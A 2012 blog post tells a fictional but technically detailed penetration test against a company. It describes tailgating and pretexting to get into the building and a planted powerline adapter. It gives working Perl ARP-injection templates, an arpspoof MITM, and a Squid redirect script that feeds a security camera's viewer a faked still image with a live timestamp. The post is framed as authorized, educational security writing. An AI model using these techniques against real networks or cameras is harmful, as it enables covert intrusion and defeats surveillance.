@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <title>The invisible woman and the axis camera</title>
+    <link href="css/main.css" rel="stylesheet" type="text/css">
+  </head>
+  
+  <body>
+    <article id="main">
+      <h1>The invisible woman and the axis camera</h1>
+      <h2>04 Feb 2012</h2>
+      <br>
+
+      <p><strong>NOTE:</strong> This post follows the style of the <a href="http://www.goodreads.com/book/show/6225696-stealing-the-network">stealing the network</a> series of books. Sometimes, when I think about a technique or a skill I consider interesting, I also imagine a real-life scenario where this technique can be applied (and I'm <a href="http://xkcd.com/208/">not the only one</a>...)</p>
+
+      <p>So, why not <em>combining technical explanations with realistic stories</em>, avoiding the usual, and sometimes boring, article style?</p>
+
+      <p>Of course I don't consider myself as good as the authors of the "official" series, especially when it comes to write a story in a language that is not mine. What follows is just a modest experiment, done largely for my own pleasure.</p>
+
+      <p>If you are only interested in technical subjects, the story includes a security camera hijack via real-time image alteration, some interesting tricks with ARP packets (of which one I bet you never heard of), and a bit of physical penetration test.</p>
+
+      <p>Anyway, I hope you'll like it...</p>
+      
+      <hr width="100%" size="2">
+      
+      <h2>Anti-aircraft Artillery</h2>
+      
+      <p>After all, entering the internal network wasn't difficult...</p>
+
+      <p>When we initially identified a WEP wireless network, we wanted to seize that low hanging fruit and avoid direct contacts with the customer as long as possible. But the enthusiasm was short-lived.</p>
+
+      <p><em>"Aren't you planning to crack that network, are you?"</em> said GrayFog in a tone of disapproval, <em>"According to the Mac address, the access point is a SonicWALL. Maybe they have maintained an obsolete encryption for backward compatibility issues, or maybe not. "</em></p>
+      
+      <p>GrayFog is our remote support, the fact he's a paranoid type by nature makes him particularly suitable for this role.</p>
+      
+      <p><em>"Do you think it's an honeypot?"</em> I replied.</p>
+      
+      <p><em>"I think nothing, my lord. But you know, Curiosity Killed The Cat..."</em></p>
+
+      <p>
+	<a href="images/sonicwall.jpg">
+	  <img class="center" title="sonicwall" alt="sonicwall" src="images/sonicwall.jpg" />
+	</a>
+      </p>
+
+      <p>When he starts to quote I feel an irresistible urge to beat him, but, as we discovered later, his advice was correct. The wireless network was kept under control, and any attack would have been <a href="http://www.sonicwall.com/us/solutions/Solutions_Clean_Wireless_Deployments.html">detected immediately</a>, if not actively blocked (apparently there's a reason for the price of SonicWALL products...)</p>
+
+      <p>Despite this drawback, we could have tried to decrypt the traffic in a passive manner, but since network traffic was very low, it would have taken too much time. However I had an ace up my sleeve.</p>
+
+      <p><em>"Since you are in citation mode, who said 'In battle one engages with the orthodox and gains victory through the unorthodox'?" </em> Just a rhetorical question...</p>
+
+      <p><em>"Are you kidding me?"</em></p>
+      
+      <p><em>"Returning to more concrete things, do you have a plan Luna?"</em> For the first time Daniel was talking, my partner in physical operations.</p>
+      
+      <p><em>"Yes, I do. But we must get our hands dirty, something low-tech."</em></p>
+
+      <h2>Orthodox and Unorthodox</h2>
+      
+      <p>Being a woman, working in this field brings some important advantages, if you are tough enough to resist.</p>
+      
+      <p>The predominant male presence, if properly exploited, allows a young girl to pass almost unnoticed during penetration tests that focus on low-tech or physical aspects. And when this doesn't happen, we are often underestimated, considered harmless.</p>
+      
+      <p>This may be annoying in traditional occupations, but a lethal weapon in the security field.</p>
+
+      <p><em>"Daniel, I need to enter the building to open a connection to the internal network."</em> I said while exiting our van, <em>"Let's try to tailgate someone through the back entrance."</em></p>
+      
+      <p>The plan was simple: first we checked to make sure no one was outside, and then started to talk near the back door.  From what we had seen in the previous days that door was used especially by smokers seeking a breath of fresh air.</p>
+
+      <p>As expected, after about ten minutes, a small group of employees started to walk out the door.</p>
+      
+      <p>When the last person was came out, I casually kept the door open and said to Daniel it was time to return to work. Daniel simply replied he had forgotten some documents and started to walk towards the car park.</p>
+      
+      <p>Then I went in, nobody stopped me.</p>
+
+      <p>Once inside I began to search for the rooms that were the objectives of our penetration testing. We had a rough map of the building, but good enough for our purposes.</p>
+      
+      <p>It didn't take long to find the Archive Room, but there seemed to be another small problem: <em>"Hey guys, I found the room, but there's an Axis camera pointed toward the door."</em></p>
+      
+      <p><em>"Ok, we'll deal with it later, for now just open an access point to the internal network."</em></p>
+
+      <p>So I proceeded to the room of network administrators. With a quick glance I checked what was happening inside: as expected, only one administrator was in the room at this time of day.</p>
+
+      <p><em>"Daniel, I need you to proceed with the 'delivery' to distract the administrator. Buy me a couple of minutes."</em></p>
+
+      <p>We had done some research and prepared a false "gift from a supplier", addressed to the administrator and requiring his signature on the package receipt. My task was simple, a few minutes would have sufficed, although it would have been funny to see Daniel disguised as a courier...</p>
+
+      <p>First of all I plugged in our alternative "access point" to the internal network: a powerline ethernet adapter.</p>
+
+      <p>
+	<a href="images/powerline_ethernet.jpg">
+	  <img class="center" title="powerline ethernet adapter" alt="powerline ethernet adapter" src="images/powerline_ethernet.jpg" />
+	</a>
+      </p>
+
+      <p><em>"They installed a Wireless-IDS, but certainly they don't expect anyone to access the network through the electrical system."</em></p>
+      
+      <p>I also noticed something very interesting: a workstation was used to monitor the security cameras... through the web interface of the devices!</p>
+      
+      <p><em>"Probably the Axis Camera protecting the archive is among the displayed videos."</em> I thought.<em> "That's a job for GrayFog..."</em></p>
+      
+      <h2>(Brief) Briefing</h2>
+      
+      <p>Luna retreated to the bathroom and locked herself in one of the small rooms. It was not the most comfortable place of the building, but it was relatively safe and she wouldn't be disturbed here.</p>
+      
+      <p><em>"Daniel, the gate is open, it's your turn now."</em></p>
+      
+      <p><em>"Cool, let's see if the suit suits you Daniel..."</em> GrayFog said, serious as ever.</p>
+      
+      <p>In the entrance of the building there were some armchairs, a sort of waiting room, accessible without showing any badges.</p>
+      
+      <p>For safety Daniel was wearing a facsimile of the badges used by the company: only to provide a more realistic image, it wouldn't have passed in the magnetic reader.</p>
+      
+      <p>He sat next to an electrical outlet, a place not too visible but not hidden, and inserted the other powerline adapter.</p>
+
+      <p><em>"Good, there's signal. I'm starting an hidden wireless network for you, GrayFog"</em></p>
+      
+      <p><em>"Thanks!"</em> He replied, <em>"Any suggestions on where to start?"</em></p>
+
+      <p><em>"Since our goal is access to the archive room, you could start disabling the security camera."</em> Daniel said.</p>
+
+      <p><em>"Actually I think there is a better and more artistic way..." </em>replied Luna hiding a smile, <em>"...just make me invisible."</em></p>
+      
+      <h2>Hide and Seek</h2>
+      
+      <p><em>"I already know the IP address of the camera, the real question is: who talks to whom?"</em></p>
+      
+      <p>GrayFog was thinking about how to find out which computers were connected to the camera, the one who where monitoring via the web interface and the server where the videos were probably sent and stored.</p>
+
+      <p>He remembered an old style, but very cool, defcon presentation: <a href="http://www.defcon.org/html/links/dc-archives/dc-15-archive.html#Daguanno">LAN Protocol Attacks Part 1 - ARP Reloaded</a>.</p>
+      
+      <p><em>"I can use their broadcast technique, but for the opposite purpose."</em></p>
+
+      <p>The presentation showed that it is possible to conduct a MITM attack against a computer in a LAN, without exposing any mac address, just poisoning its cache with a broadcast layer2 destination address. In this way the behavior of the network switch becomes like that of an old hub, forwarding target's packets to all its network ports.</p>
+
+      <p><em>"I think this might work in reverse: announcing with an ARP packet that the camera has a broadcast MAC, should make me able to sniff all the IPs that are communicating with it. And maybe get also a few packets of the communication."</em></p>
+      
+      <p>GrayFog modified on the fly one of his perl scripts, containing the structure of an ARP packet:</p>
+
+<pre style="color:#000000;background:#ffffff;"><span style="color:#696969;">#!</span><span style="color:#007997;">/usr/bin/perl</span>
+
+<span style="color:#800000;font-weight:bold;">print</span>
+<span style="color:#696969;"># ethernet header</span>
+    <span style="color:#0000e6;">"ff ff ff ff ff ff "</span> <span style="color:#808030;">.</span> <span style="color:#696969;"># destination</span>
+    <span style="color:#0000e6;">"aa bb cc dd ee ff "</span> <span style="color:#808030;">.</span> <span style="color:#696969;"># source</span>
+    <span style="color:#0000e6;">"</span><span style="color:#008c00;">08 </span><span style="color:#008c00;">06</span><span style="color:#0000e6;"> "</span> <span style="color:#808030;">.</span>             <span style="color:#696969;"># type (ARP)</span>
+<span style="color:#696969;"># arp header</span>
+    <span style="color:#0000e6;">"</span><span style="color:#008c00;">00</span><span style="color:#008c00;"> 01</span><span style="color:#0000e6;"> "</span> <span style="color:#808030;">.</span>             <span style="color:#696969;"># hardware type (ethernet)</span>
+    <span style="color:#0000e6;">"</span><span style="color:#008c00;">08</span><span style="color:#008c00;"> 00</span><span style="color:#0000e6;"> "</span> <span style="color:#808030;">.</span>             <span style="color:#696969;"># protocol type (ip)</span>
+    <span style="color:#0000e6;">"</span><span style="color:#008c00;">06</span><span style="color:#0000e6;"> "</span> <span style="color:#808030;">.</span>                <span style="color:#696969;"># hardware size</span>
+    <span style="color:#0000e6;">"</span><span style="color:#008c00;">04</span><span style="color:#0000e6;"> "</span> <span style="color:#808030;">.</span>                <span style="color:#696969;"># protocol size</span>
+    <span style="color:#0000e6;">"</span><span style="color:#008c00;">00</span><span style="color:#008c00;"> 01</span><span style="color:#0000e6;"> "</span> <span style="color:#808030;">.</span>             <span style="color:#696969;"># reply</span>
+    <span style="color:#0000e6;">"ff ff ff ff ff ff "</span> <span style="color:#808030;">.</span> <span style="color:#696969;"># sender mac (broadcast mac for the axis camera)</span>
+    <span style="color:#0000e6;">"c0 a8 </span><span style="color:#008c00;">01</span><span style="color:#008c00;"> 09</span><span style="color:#0000e6;"> "</span> <span style="color:#808030;">.</span>       <span style="color:#696969;"># sender ip (ip of teh axis camera)</span>
+    <span style="color:#0000e6;">"ff ff ff ff ff ff "</span> <span style="color:#808030;">.</span> <span style="color:#696969;"># target mac (broadcast)</span>
+    <span style="color:#0000e6;">"ff ff ff ff "</span> <span style="color:#808030;">.</span>       <span style="color:#696969;"># target ip (broadcast)</span>
+    <span style="color:#0000e6;">"</span><span style="color:#0f69ff;">\n</span><span style="color:#0000e6;">"</span><span style="color:#800080;">;</span></pre>
+
+      <p>He than injected the packet using <a href="http://hexinject.sourceforge.net/">hexinject</a>:</p>
+      
+<pre>root@daedalus# perl ./arp_packet.pl | sudo hexinject -p</pre>
+
+      <p>The advantage of using this approach is that is possible to keep the packet's structure separated from the injecting code. GrayFog liked to maintain a directory containing templates (saved as perl, python or even bash scripts) for each protocol he used so far, always ready for this kind of network magic.</p>
+
+      <p>Immediately after sending the package, tcpdump began to print output. Two hosts were particularly interesting: the first performed HTTP requests to the page "video.cgi", the second showed FTP traffic.</p>
+      
+      <p><em>"Luna, I found the administrator's computer"</em> said GrayFog in the microphone, <em>"and also the FTP server used to log events. Just a little, and you'll have every right to quote Susan Storm..."</em></p>
+      
+      <h2>As Dumb as a Squid</h2>
+
+      <p><em>"The FTP server is very easy to handle: I'll just impose it the silence."</em></p>
+      
+      <p>Another interesting technique from the defcon presentation was sending an ARP packet to the victim saying the log server is at its local interface. After that, successive log packets sent by the victim never reach the network, since the kernel forwards them to the loopback interface.</p>
+
+      <p>
+	<a href="images/silenced.png">
+	  <img class="center" title="ethernet host silenced" alt="ethernet host silenced" src="images/silenced.png" />
+	</a>
+      </p>
+
+      <p>Even this time preparing the attack was a matter of seconds:</p>
+
+<pre style="color:#000000;background:#ffffff;"><span style="color:#696969;">#!</span><span style="color:#007997;">/usr/bin/perl</span>
+
+<span style="color:#800000;font-weight:bold;">print</span>
+<span style="color:#696969;"># ethernet header</span>
+    <span style="color:#0000e6;">"c0 ff ee c0 ff ee "</span> <span style="color:#808030;">.</span> <span style="color:#696969;"># destination</span>
+    <span style="color:#0000e6;">"aa bb cc dd ee ff "</span> <span style="color:#808030;">.</span> <span style="color:#696969;"># source</span>
+    <span style="color:#0000e6;">"</span><span style="color:#008c00;">08</span><span style="color:#008c00;"> 06</span><span style="color:#0000e6;"> "</span> <span style="color:#808030;">.</span>             <span style="color:#696969;"># type (ARP)</span>
+<span style="color:#696969;"># arp header</span>
+    <span style="color:#0000e6;">"</span><span style="color:#008c00;">00 </span><span style="color:#008c00;">01</span><span style="color:#0000e6;"> "</span> <span style="color:#808030;">.</span>             <span style="color:#696969;"># hardware type (ethernet)</span>
+    <span style="color:#0000e6;">"</span><span style="color:#008c00;">08</span><span style="color:#008c00;"> 00</span><span style="color:#0000e6;"> "</span> <span style="color:#808030;">.</span>             <span style="color:#696969;"># protocol type (ip)</span>
+    <span style="color:#0000e6;">"</span><span style="color:#008c00;">06</span><span style="color:#0000e6;"> "</span> <span style="color:#808030;">.</span>                <span style="color:#696969;"># hardware size</span>
+    <span style="color:#0000e6;">"</span><span style="color:#008c00;">04</span><span style="color:#0000e6;"> "</span> <span style="color:#808030;">.</span>                <span style="color:#696969;"># protocol size</span>
+    <span style="color:#0000e6;">"</span><span style="color:#008c00;">00</span><span style="color:#008c00;"> 01</span><span style="color:#0000e6;"> "</span> <span style="color:#808030;">.</span>             <span style="color:#696969;"># reply</span>
+    <span style="color:#0000e6;">"c0 ff ee c0 ff ee "</span> <span style="color:#808030;">.</span> <span style="color:#696969;"># sender mac (camera mac address)</span>
+    <span style="color:#0000e6;">"c0 a8 </span><span style="color:#008c00;">01</span><span style="color:#0000e6;"> 0a "</span> <span style="color:#808030;">.</span>       <span style="color:#696969;"># sender ip (ftp server ip)</span>
+    <span style="color:#0000e6;">"c0 ff ee c0 ff ee "</span> <span style="color:#808030;">.</span> <span style="color:#696969;"># target mac </span>
+    <span style="color:#0000e6;">"c0 a8 </span><span style="color:#008c00;">01</span><span style="color:#008c00;"> 09</span><span style="color:#0000e6;"> "</span> <span style="color:#808030;">.</span>       <span style="color:#696969;"># target ip (camera ip)</span>
+    <span style="color:#0000e6;">"</span><span style="color:#0f69ff;">\n</span><span style="color:#0000e6;">"</span><span style="color:#800080;">;</span></pre>
+
+      <p>After starting a script to repeatedly inject silencer packets, GrayFog turned his attention to the monitoring host.</p>
+
+      <p>To analyze the requests made ​​to the camera, he used a nice tool called <a href="http://dumpsterventures.com/jason/httpry/">httpry</a>, able to extract and parse HTTP request sniffed from the network:</p>
+      
+<pre>root@daedalus# httpry
+httpry version 0.1.5 -- HTTP logging and information retrieval tool
+Copyright (c) 2005-2009 Jason Bittel &lt;jason.bittel@gmail.com&gt;
+Starting capture on eth0 interface
+2012-02-04 12:41:48    192.168.1.30     192.168.1.9    &gt;    GET    192.168.1.9    /view/view.shtml    HTTP/1.1    -    -
+2012-02-04 12:41:49     192.168.1.9    192.168.1.30    &lt;    -    -    -    HTTP/1.0    200    OK
+2012-02-04 12:41:49    192.168.1.30     192.168.1.9    &gt;    GET    192.168.1.9    /css/other.css    HTTP/1.1    -    -
+2012-02-04 12:41:49     192.168.1.9    192.168.1.30    &lt;    -    -    -    HTTP/1.0    304    Not Modified
+2012-02-04 12:41:49    192.168.1.30     192.168.1.9    &gt;    GET    192.168.1.9    /axis-cgi/mjpg/video.cgi?camera=&amp;resolution=704x576&amp;1328355709315    HTTP/1.1    -    -
+...
+^CCaught SIGINT, shutting down...
+2105 packets received, 0 packets dropped, 8 http packets parsed
+  6014.3 packets/min, 22.9 http packets/min</pre>
+
+      <p><em>"Umm... I think Squid can do the job!"</em></p>
+
+      <p><a href="http://www.squid-cache.org/">Squid</a> is the standard <em>de facto</em> in the field of open source web proxies. Thousands of providers around the world use it for its versatility and stability. In addition, the abilities to act as a transparent proxy and to modify requests through the use of external scripts make it a powerful tool in the hands of a penetration tester.</p>
+
+      <p>GrayFog wrote the iptables rules needed to transparently redirect HTTP packets to the squid server running on his machine:</p>
+      
+<pre>iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080</pre>
+
+      <p>The second thing he did was to enable transparent mode in <em>/etc/squid3/squid.conf</em> and add a line to call an external script for the analysis and alteration of requests:</p>
+      
+<pre style="color:#000000;background:#ffffff;">http_port <span style="color:#008c00;">8080</span> transparent
+
+acl manager proto cache_object
+
+acl localhost src <span style="color:#008000;">127.0</span><span style="color:#808030;">.</span><span style="color:#008000;">0.1</span><span style="color:#808030;">/</span><span style="color:#008c00;">32</span> <span style="color:#800080;">::</span><span style="color:#008c00;">1</span>
+acl to_localhost dst <span style="color:#008000;">127.0</span><span style="color:#808030;">.</span><span style="color:#008000;">0.0</span><span style="color:#808030;">/</span><span style="color:#008c00;">8</span> <span style="color:#008000;">0.0</span><span style="color:#808030;">.</span><span style="color:#008000;">0.0</span><span style="color:#808030;">/</span><span style="color:#008c00;">32</span> <span style="color:#800080;">::</span><span style="color:#008c00;">1</span>
+acl lan_net src <span style="color:#008000;">192.168</span><span style="color:#808030;">.</span><span style="color:#008000;">1.0</span><span style="color:#808030;">/</span><span style="color:#008c00;">24</span>
+
+http_access allow lan_net
+
+<span style="color:#004a43;">#http_access deny CONNECT </span><span style="color:#808030;">!</span><span style="color:#004a43;">SSL_ports </span><span style="color:#808030;">#</span><span style="color:#004a43;"> comment this </span><span style="color:#004a43;">line</span>
+
+redirect_program <span style="color:#808030;">/</span>tmp<span style="color:#808030;">/</span>test<span style="color:#808030;">.</span>pl <span style="color:#808030;">#</span> external script</pre>
+Then he captured a camera snapshot, removed the timestamp line from the image and wrote (yet) another script:
+<pre style="color:#000000;background:#ffffff;"><span style="color:#696969;">#!</span><span style="color:#007997;">/usr/bin/perl</span>
+
+<span style="color:#797997;">$|</span><span style="color:#808030;">=</span><span style="color:#008c00;">1</span><span style="color:#800080;">;</span>
+$count <span style="color:#808030;">=</span> <span style="color:#008c00;">0</span><span style="color:#800080;">;</span>
+$pid <span style="color:#808030;">=</span> <span style="color:#797997;">$$</span><span style="color:#800080;">;</span>
+
+<span style="color:#800000;font-weight:bold;">while</span> <span style="color:#808030;">(</span><span style="color:#40015a;">&lt;&gt;</span><span style="color:#808030;">)</span> <span style="color:#800080;">{</span>
+        <span style="color:#400000;">chomp</span> $_<span style="color:#800080;">;</span>
+        <span style="color:#800000;font-weight:bold;">if</span> <span style="color:#808030;">(</span>$_ <span style="color:#808030;">=</span><span style="color:#808030;">~</span><span style="color:#800000;">/</span><span style="color:#0000e6;">video</span><span style="color:#0f69ff;">\.</span><span style="color:#0000e6;">cgi</span><span style="color:#800000;">/</span><span style="color:#800000;font-weight:bold;">i</span><span style="color:#808030;">)</span> <span style="color:#800080;">{</span>
+                $url <span style="color:#808030;">=</span> <span style="color:#797997;">$1</span><span style="color:#800080;">;</span>
+
+                <span style="color:#696969;"># get current timestamp</span>
+                $date_output <span style="color:#808030;">=</span> <span style="color:#0000e6;background:#ffffe8;">`</span><span style="color:#000000;background:#ffffe8;">date</span><span style="color:#0000e6;background:#ffffe8;">`</span><span style="color:#800080;">;</span>
+
+                <span style="color:#696969;"># update snapshot timestamp</span>
+                <span style="color:#400000;">system</span><span style="color:#808030;">(</span><span style="color:#0000e6;">"convert /tmp/original_snapshot.jpg -crop 0x0+20+20 -fill White -background Black label:'Camera Text - $date_output' +swap -append /var/www/snapshot.jpg"</span><span style="color:#808030;">)</span><span style="color:#800080;">;</span>
+
+                <span style="color:#696969;"># redirect to our modified snapshot</span>
+                <span style="color:#800000;font-weight:bold;">print</span> <span style="color:#0000e6;">"</span><span style="color:#5555dd;">http://localhost/snapshot.jpg</span><span style="color:#0f69ff;">\n</span><span style="color:#0000e6;">"</span><span style="color:#800080;">;</span>
+
+        <span style="color:#800080;">}</span>
+        <span style="color:#800000;font-weight:bold;">else</span> <span style="color:#800080;">{</span>
+                <span style="color:#800000;font-weight:bold;">print</span> <span style="color:#0000e6;">"$_</span><span style="color:#0f69ff;">\n</span><span style="color:#0000e6;">"</span><span style="color:#800080;">;</span><span style="color:#800080;">;</span>
+        <span style="color:#800080;">}</span>
+        $count<span style="color:#808030;">+</span><span style="color:#808030;">+</span><span style="color:#800080;">;</span>
+<span style="color:#800080;">}</span></pre>
+
+      <p>This last script analyzes HTTP requests searching for queries containing "video.cgi". When a matching request is found, it's redirected to a modified snapshot hosted on the attacker's machine.</p>
+      
+      <p>The snapshot is a static image, but its time-stamp is updated in real time with the aid of <a href="http://www.imagemagick.org/script/index.php">imagemagick</a>, making the attack realistic and difficult to spot.</p>
+
+      <p>An example of the technique (original image):</p>
+
+      <p>
+	<a href="images/axis_original.jpg">
+	  <img class="center" title="original axis camera image" alt="original axis camera image" src="images/axis_original.jpg" />
+	</a>
+      </p>
+
+      <p>Altered image:</p>
+
+      <p>
+	<a href="images/axis_altered.jpg">
+	  <img class="center" title="altered axis camera image" alt="altered axis camera image" src="images/axis_altered.jpg" />
+	</a>
+      </p>
+
+      <p><em>"Yes, the font of the timestamp could be improved a bit,"</em> mumbled GrayFog <em>"but in this case there is no need to complicate things further."</em> And he just launched <a href="http://monkey.org/~dugsong/dsniff/">arpspoof</a>, to start the MITM:</p>
+      
+<pre># arpspoof -t 192.168.1.30 192.168.1.9</pre>
+
+      <p><em>"Luna, could you please end this mission?"</em> He said.<em> "Ah! I was also thinking whether to call you Miss Storm from now on..."</em></p>
+      
+      <p><em>"Only if you do not expect to be called Mr. Fantastic..."</em> she replied.</p>
+      
+
+      <h2>Conclusion, Surprise, Misery on us</h2>
+
+      <p>When we presented photos and photocopies of documents taken from the archive, in the conclusive meeting with our customers, everyone was very skeptical. Especially when we explained some "technical details" of the penetration test.</p>
+
+      <p>Indeed, once bypassed the camera, picking the archive's lock was a breeze...</p>
+
+      <p>They even made us simulate the last part of the attack. The managers and the admins were not very happy when I started to walk past the camera and, despite the accurate time-stamp, my movements didn't appear either in the web interface or on the FTP server.</p>
+
+      <p>But I could swear that at least one of the administrators held a laugh: the most clever of the group...</p>
+
+    </article>
+  </body>
+</html>
